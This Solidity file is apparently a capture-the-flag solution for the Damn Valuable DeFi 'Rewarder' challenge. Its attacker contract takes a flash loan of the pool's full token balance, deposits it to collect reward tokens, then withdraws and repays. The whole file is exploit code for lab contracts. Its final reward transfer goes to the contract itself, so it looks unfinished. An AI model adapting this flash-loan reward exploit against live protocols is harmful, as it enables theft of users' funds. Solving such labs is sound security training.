// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "hardhat/console.sol";
import "./DamnValuableToken.sol";
import "./RewarderPool.sol";
import "./RewardToken.sol";

contract Attacker {
    FlashLoanerPool public flashLoanerPool;
    DamnValuableToken public damnToken;
    TheRewarderPool public rewarderPool;
    RewardToken public rewarderToken;

    constructor(
        address _flashLoaner,
        address _damnValuableToken,
        address _rewarderPool,
        address _rewardToken
    ) {
        flashLoanerPool = FlashLoanerPool(_flashLoaner);
        damnToken = DamnValuableToken(_damnValuableToken);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewarderToken = RewardToken(_rewardToken);
    }

    function getTokens() public {
        uint256 amount = damnToken.balanceOf(address(flashLoanerPool));
        // uint256 amount = 1;
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public {
        console.log("Balance before :", damnToken.balanceOf(address(this)));
        console.log("amount:", amount);
        damnToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        console.log(
            "Balance after deposit :",
            damnToken.balanceOf(address(this))
        );
        // rewarderPool.distributeRewards();
        rewarderPool.withdraw(amount);
        console.log(
            "Balance before transfer back :",
            damnToken.balanceOf(address(this))
        );
        damnToken.transfer(msg.sender, amount);
        rewarderToken.transfer(
            address(this),
            rewarderToken.balanceOf(address(this))
        );

        console.log("Balance after :", damnToken.balanceOf(address(this)));
    }

    fallback() external payable {
        // if(msg.sender == address(rewarderPool)) {
        //     damnToken.transfer(msg.sender, amount);
        // }
        console.log("receiving tokens");
    }

    receive() external payable {}
}
